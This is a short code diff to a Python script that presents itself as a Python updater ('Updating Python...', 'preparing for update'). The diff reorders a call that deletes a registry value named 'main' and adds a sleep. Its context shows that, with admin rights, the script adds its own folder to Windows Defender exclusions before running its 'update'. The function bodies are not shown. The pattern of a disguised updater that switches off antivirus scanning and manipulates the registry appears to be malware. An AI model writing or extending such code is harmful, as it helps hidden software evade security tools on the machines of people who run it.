@@ -64,6 +64,7 @@ class Main:
                 winreg.DeleteValue(key, "main")  # type: ignore
             except Exception as e:
                 print(f"{e}")
+                time.sleep(2)
         except Exception as e:
             print(f"Registry Fehler: {e}")
 
@@ -72,8 +73,8 @@ if __name__ == "__main__":
     if is_admin:
         print("Gathering dependencies and preparing for update...")
         self.add_folder_to_windows_defender_exclusions()
+        self.remove_hkey() #321
         self.perform_update()
-        self.remove_hkey()
         exit(0)
     if self.send_update_notification():
         print("Updating Python...")
